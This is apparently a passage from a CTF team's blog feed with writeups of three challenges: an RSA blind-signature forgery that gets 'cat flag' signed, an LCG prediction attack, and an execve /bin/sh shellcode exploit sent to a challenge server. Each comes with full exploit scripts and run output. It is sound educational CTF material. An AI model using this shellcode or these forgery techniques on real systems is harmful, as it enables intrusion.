class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Lazy way to find a valid r value</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(r_,<span class="number">99999999999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = safe_unhexlify(M/x)</span><br><span class="line">        t = shlex.split(m)</span><br><span class="line">        b = len(t) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> ValueError: <span class="comment"># some characters like quotes and shit can fuck up the signing because of shlex.split</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span>(M % x == <span class="number">0</span> <span class="keyword">and</span> b):</span><br><span class="line">        r_ = x</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>The valid <strong>r</strong> ended up being the number 408479, the full code to this challenge is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify,hexlify</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">N = <span class="number">26507591511689883990023896389022361811173033984051016489514421457013639621509962613332324662222154683066173937658495362448733162728817642341239457485221865493926211958117034923747221236176204216845182311004742474549095130306550623190917480615151093941494688906907516349433681015204941620716162038586590895058816430264415335805881575305773073358135217732591500750773744464142282514963376379623449776844046465746330691788777566563856886778143019387464133144867446731438967247646981498812182658347753229511846953659235528803754112114516623201792727787856347729085966824435377279429992530935232902223909659507613583396967</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_unhexlify</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(<span class="string">"%x"</span> % n) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        m = unhexlify(<span class="string">"0"</span>+(<span class="string">"%x"</span> % n))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = unhexlify(<span class="string">"%x"</span> % n)</span><br><span class="line">    <span class="keyword">return</span> m    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(message, dont_skip=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (dont_skip):</span><br><span class="line">        <span class="keyword">print</span> r.recvuntil(<span class="string">"Enter your command:\r\n"</span>)</span><br><span class="line">    r.sendline(<span class="string">"sign "</span>+<span class="string">"sign"</span>)</span><br><span class="line">    r.sendline(base64.b64encode(message))</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">r'\d+'</span>,r.recvuntil(<span class="string">"Enter your command:\r\n"</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span><span class="params">(signature, command)</span>:</span></span><br><span class="line">    r.sendline(str(signature) + <span class="string">" "</span> + command)</span><br><span class="line">    <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">r_ =  <span class="number">2</span></span><br><span class="line">r = remote(<span class="string">'blind.q.2019.volgactf.ru'</span>,<span class="number">7070</span>)</span><br><span class="line">M = int(hexlify(<span class="string">"cat flag"</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lazy way to find a valid r value</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(r_,<span class="number">99999999999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = safe_unhexlify(M/x)</span><br><span class="line">        t = shlex.split(m)</span><br><span class="line">        b = len(t) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> ValueError: <span class="comment"># some characters like quotes and shit can fuck up the signing because of shlex.split</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span>(M % x == <span class="number">0</span> <span class="keyword">and</span> b):</span><br><span class="line">        r_ = x</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"r=%d and M=%d"</span> % (r_,M)</span><br><span class="line"></span><br><span class="line">mBlinded = sign(m) <span class="comment"># M / r_</span></span><br><span class="line">sBlinded = sign(safe_unhexlify(r_), <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">S = (int(mBlinded) * int(sBlinded)) % N</span><br><span class="line">cat(S,<span class="string">"cat flag"</span>)</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Now running it and obtaining the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python blind.py</span><br><span class="line">[+] Opening connection to blind.q.2019.volgactf.ru on port 7070: Done</span><br><span class="line">r=408479 and M=7161132565001953639</span><br><span class="line">Enter your <span class="built_in">command</span>:</span><br><span class="line"></span><br><span class="line">VolgaCTF&#123;B1ind_y0ur_tru3_int3nti0n5&#125;</span><br><span class="line"></span><br><span class="line">[*] Closed connection to blind.q.2019.volgactf.ru port 7070</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Blind 200&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;Pull the flag…if you can.&lt;br&gt;nc blind.q.2019.vo
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="RSA" scheme="https://teamrocketist.github.io/tags/RSA/"/>
    
      <category term="homomorphic" scheme="https://teamrocketist.github.io/tags/homomorphic/"/>
    
      <category term="blindSignatures" scheme="https://teamrocketist.github.io/tags/blindSignatures/"/>
    
      <category term="volgactf2019" scheme="https://teamrocketist.github.io/tags/volgactf2019/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] VolgaCtf2019 - LG</title>
    <link href="https://teamrocketist.github.io/2019/03/31/Crypto-VolgaCtf2019-LG/"/>
    <id>https://teamrocketist.github.io/2019/03/31/Crypto-VolgaCtf2019-LG/</id>
    <published>2019-03-31T15:19:21.000Z</published>
    <updated>2019-07-22T05:54:27.939Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>LG 100</p></blockquote><blockquote><p><strong>Description</strong>:<br>WazzUP! My homie bought a new UltraSmartTV, but he forgot a secret key from an admin panel.</p><p>After a few attempts to crack this “smart” IoT device it started to generate new passwords on its own, and now we are stuck.</p></blockquote><h3 id="Identifying-the-problem"><a href="#Identifying-the-problem" class="headerlink" title="Identifying the problem"></a>Identifying the problem</h3><p>The first time I read the description of this task didn’t helped me at all I mean a LG television ? After doing connection with the server I saw the server was giving us some random numbers and asked us to predict the next. Well after this I remembered last year I was looking at an attack against Linear Congruential Generators (LCG) and I thought to myself this is probably a <strong>LCG</strong> because the title is similar <strong>LG</strong>.</p><h3 id="What-is-a-LCG"><a href="#What-is-a-LCG" class="headerlink" title="What is a LCG ?"></a>What is a LCG ?</h3><p>LCG can be defined as:</p><p><img src="https://i.imgur.com/zWunuLf.png" alt></p><p>Where:   </p><ul><li>X(n) is a sequence of pseudo random values.</li><li>p is modulo defined as 0 &lt; p</li><li>a is the multiplier defined as 0 &lt; a &lt; p</li><li>c is the increment 0 &lt;= c &lt; p ( if c = 0 the LCG is called Multiplicative Congruential Generator)</li></ul><p>An example implementation of LCG in python:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCGPrng</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, p, a, c)</span>:</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.x = random.randint(<span class="number">0</span>, p)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.x = (self.a*self.x + self.c) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br></pre></td></tr></table></figure></p><p>We have no knowledge of <strong>a</strong>,<strong>c</strong> and <strong>p</strong> and initial seed for x was chosen randomly, this attack is based in <a href="https://www.pnas.org/content/pnas/61/1/25.full.pdf" target="_blank" rel="noopener">George Marsaglia analyzed Pseudo Random Number Generators</a> in which he found a flaw in LCG.</p><p>This can be done with 2x2 matrix or a 3x3 matrix, I used 2x2 matrix like this guy from <a href="http://sandeepmore.com/blog/2012/03/23/breaking-linear-congruential-generator/" target="_blank" rel="noopener">here</a> .</p><p>For example if the out of the generated sequence is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X(<span class="number">0</span>) = <span class="number">64302589647963933737451564</span></span><br><span class="line">X(<span class="number">1</span>) = <span class="number">23099347408308738343740115</span></span><br><span class="line">X(<span class="number">2</span>) = <span class="number">60779187967701597680605077</span></span><br><span class="line">X(<span class="number">3</span>) = <span class="number">41531243105709646792416331</span></span><br><span class="line">X(<span class="number">4</span>) = <span class="number">71461317334046189800115379</span></span><br><span class="line">X(<span class="number">5</span>) = <span class="number">50094315434186546595562390</span></span><br><span class="line">X(<span class="number">6</span>) = <span class="number">27719142972686291997765807</span></span><br></pre></td></tr></table></figure><p>From 7 numbers we can generate 4 2x2 matrices like this:</p><p><img src="https://i.imgur.com/oFV5g5u.png" alt></p><p>If you wanted to do with 3x3 matrices they could be formed like this:</p><p><img src="https://i.imgur.com/Q10j1wP.png" alt></p><p>The determinant of the matrix is an integer multiple of the modulus p used in <strong>LCG</strong>. The gcd of <strong>two</strong> random multiples of <strong>p</strong> will be <strong>p</strong> with probability <strong>6/π^2 = 0.61</strong> and if you take the gcd of <strong>all</strong> of this integers it should provide us the real modulus p with a <strong>higher probability</strong>. To calculate each determinant of the matrices above you need remember something from linear algebra classes, calculating a determinant from a 2x2 matrix is pretty trivial this can be done with this formula:</p><p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/5b2e40d390e1d26039aabee44c7d1d86c8755232" alt></p><p>Note that if you choose to go with the 3x3 matrices the calculation is in a different way.</p><p>Now the GCD of these matrices should provide us with the real modulus <strong>p</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p0 = GCD(DeterminantOfMatrix0, DeterminantOfMatrix1)</span><br><span class="line">p1 = GCD(p0, DeterminantOfMatrix2)</span><br><span class="line">P = GCD(p1, DeterminantOfMatrix3)</span><br></pre></td></tr></table></figure><p>Knowing <strong>p</strong> we can find <strong>a</strong> and <strong>c</strong> by solving simple equations:</p><p>Finding <strong>a</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/wnEXKGK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/wnEXKGK.png" alt><br></a><br>Finding <strong>c</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/3kWOL3S.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3kWOL3S.png" alt><br></a><br>The next number is given by:<br><img src="https://i.imgur.com/eh96Ad2.png" alt></p><p>The equivalent code to solve this is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_det</span><span class="params">(i,j,X)</span>:</span></span><br><span class="line">    <span class="string">""" Calculate the values for the matrix[lattice] """</span></span><br><span class="line">    a1 = X[i] - X[<span class="number">0</span>]</span><br><span class="line">    b1 = X[i+<span class="number">1</span>] - X[<span class="number">1</span>]</span><br><span class="line">    a2 = X[j] - X[<span class="number">0</span>]</span><br><span class="line">    b2 = X[j+<span class="number">1</span>] - X[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="string">""" Calculate the determinant """</span></span><br><span class="line">    det = a1*b2 - a2*b1</span><br><span class="line">    <span class="keyword">return</span> abs(det)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="string">""" Euclidean Algo"""</span></span><br><span class="line">    a = abs(a)</span><br><span class="line">    b = abs(b)</span><br><span class="line">    <span class="keyword">while</span> a:</span><br><span class="line">            a,b = long(b%a),a</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modInverse</span><span class="params">(a, m)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> GCD(a, m) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span> <span class="comment"># no mod inverse if a &amp; m aren't relatively prime</span></span><br><span class="line"></span><br><span class="line">    u1, u2, u3 = <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    v1, v2, v3 = <span class="number">0</span>, <span class="number">1</span>, m</span><br><span class="line">    <span class="keyword">while</span> v3 != <span class="number">0</span>:</span><br><span class="line">        q = u3 // v3 <span class="comment"># // is the integer division operator</span></span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    <span class="keyword">return</span> u1 % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            X = []</span><br><span class="line">            r = remote(<span class="string">'lg.q.2019.volgactf.ru'</span>, <span class="number">8801</span>)</span><br><span class="line">            r.recvuntil(<span class="string">"Try this:\n"</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">                n =int(r.recvline().strip())</span><br><span class="line">                <span class="keyword">print</span> n</span><br><span class="line">                X.append(n) </span><br><span class="line">            r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'--------------'</span></span><br><span class="line">            </span><br><span class="line">            Det_X = []</span><br><span class="line">            Det_X.append(calc_det(<span class="number">1</span>,<span class="number">2</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line">            Det_X.append(calc_det(<span class="number">2</span>,<span class="number">3</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line">            Det_X.append(calc_det(<span class="number">3</span>,<span class="number">4</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line">            Det_X.append(calc_det(<span class="number">4</span>,<span class="number">5</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line"></span><br><span class="line">            found_p = reduce(GCD, Det_X)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># To find 'a' and 'c' we need to solve the simple equation:</span></span><br><span class="line">            <span class="comment">#   a = ((x3 - x4)*INVERSE_MODULE((x2-x3),p))%p</span></span><br><span class="line">            <span class="comment"># And:</span></span><br><span class="line">            <span class="comment"># c = (x4 - a*x3)%p</span></span><br><span class="line">            <span class="comment"># Where x2, x3, x4 are all numbers generated by the LCG that we got already!</span></span><br><span class="line"></span><br><span class="line">            mod_inv_a = modInverse((X[<span class="number">2</span>]-X[<span class="number">3</span>]), found_p) <span class="comment"># Here we find the modular inverse of x2-x3 with modulo p</span></span><br><span class="line">            found_a = ((X[<span class="number">3</span>] - X[<span class="number">4</span>])*mod_inv_a)%found_p</span><br><span class="line">            <span class="keyword">print</span> found_a <span class="comment">#found_a will be the correct a with high probability.</span></span><br><span class="line"></span><br><span class="line">            found_c = (X[<span class="number">4</span>] - found_a*X[<span class="number">3</span>])%found_p</span><br><span class="line">            <span class="keyword">print</span> found_c <span class="comment">#found_c will be the correct a with high probability, clearly depending on the correctness of a</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Found: %d as P, %d as a and %d as c"</span> % (found_p, found_a, found_c)</span><br><span class="line">            r.sendline(str((found_a * X[<span class="number">-1</span>] + found_c) % found_p))</span><br><span class="line">            <span class="keyword">print</span> r.recvall()</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ python lol.py</span><br><span class="line">[+] Opening connection to lg.q.2019.volgactf.ru on port 8801: Done</span><br><span class="line">64708864023319939604022646</span><br><span class="line">51838154021189816354186379</span><br><span class="line">22661473037375677492051015</span><br><span class="line">67787858287294194078929082</span><br><span class="line">65543613026965543757917756</span><br><span class="line">68747435477887801975414929</span><br><span class="line">52410286788865373905332250</span><br><span class="line">--------------</span><br><span class="line">83765940583638585693638595</span><br><span class="line">9751638931180187</span><br><span class="line">3802</span><br><span class="line">Found: 83765940583638585693638595 as P, 9751638931180187 as a and 3802 as c</span><br><span class="line">[+] Receiving all data: Done (64B)</span><br><span class="line">[*] Closed connection to lg.q.2019.volgactf.ru port 8801</span><br><span class="line">CONGRATULATIONS!</span><br><span class="line">VolgaCTF&#123;pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs&#125;</span><br></pre></td></tr></table></figure></p><p>The flag was <strong>VolgaCTF{pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;LG 100&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;WazzUP! My homie bought a new UltraSmartTV, but he
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="volgactf2019" scheme="https://teamrocketist.github.io/tags/volgactf2019/"/>
    
      <category term="lcg" scheme="https://teamrocketist.github.io/tags/lcg/"/>
    
      <category term="randomness" scheme="https://teamrocketist.github.io/tags/randomness/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BsidesSF 2019 - runitplusplus</title>
    <link href="https://teamrocketist.github.io/2019/03/06/Pwn-BsidesSF-2019-runitplusplus/"/>
    <id>https://teamrocketist.github.io/2019/03/06/Pwn-BsidesSF-2019-runitplusplus/</id>
    <published>2019-03-06T02:17:09.000Z</published>
    <updated>2019-03-06T07:16:45.126Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>runitplusplus 52</p></blockquote><blockquote><p><strong>Description</strong>:<br>This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt</p><p>Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353</p><p>   runitplusplus</p></blockquote><p>As the description says this is the same as the <strong>runit</strong> challenge but with a bit of reversing:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/k5s3dlN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/k5s3dlN.png" alt><br></a></p><p>The shell code I used for this was <strong>\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80</strong>, if we use this <a href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener">website</a> to check what this shellcode does:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/SGGg6NQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/SGGg6NQ.png" alt><br></a></p><p>Everything looks right we are clearing <strong>EAX</strong> and <strong>EDX</strong> in the beginning, we are pushing the <strong>bin/sh</strong> string into the stack and put its address <strong>ECX</strong> the <strong>EDX</strong> must be zero because it’s the <strong>envp</strong> argument and <strong>EAX</strong> is 0xb which is the <strong>execve</strong> system call number, so now we just need to reverse this shell code, we can use python to do that in my case I used <strong>[::-1]</strong> which reverses the string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'runitplusplus-a36bf652.challenges.bsidessf.net'</span></span><br><span class="line">port = <span class="number">5353</span></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line">filename = <span class="string">'runitplusplus'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'</span>[::<span class="number">-1</span>]</span><br><span class="line">r = getConn()</span><br><span class="line">gdb.attach(r, <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048680</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(SHELLCODE)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>So lets put a break point right on the address <strong>0x8048680</strong> which is right before the program does <strong>CALL EAX</strong> and do a step in and lets what what happened to the shell code after running that for loop:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/5m53dsK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5m53dsK.png" alt><br></a></p><p>So to circumvent this what I did is to repeat the first 4 bytes of my shell code which was the code for <strong>xor eax,eax</strong> and <strong>xor edx,edx</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/yZo3OQb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yZo3OQb.png" alt><br></a></p><p>So we need to add this to our original shell code and we get this <strong>\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80</strong> which in assembly is:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/DYWwyyW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/DYWwyyW.png" alt><br></a></p><p>So lets check how it looks in gdb with the breakpoint:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/snueZSE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/snueZSE.png" alt><br></a></p><p>Now that everything is fine we are ready to run the script on the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'runitplusplus-a36bf652.challenges.bsidessf.net'</span></span><br><span class="line">port = <span class="number">5353</span></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line">filename = <span class="string">'runitplusplus'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'</span>[::<span class="number">-1</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#gdb.attach(r, '''</span></span><br><span class="line"><span class="comment">#    b 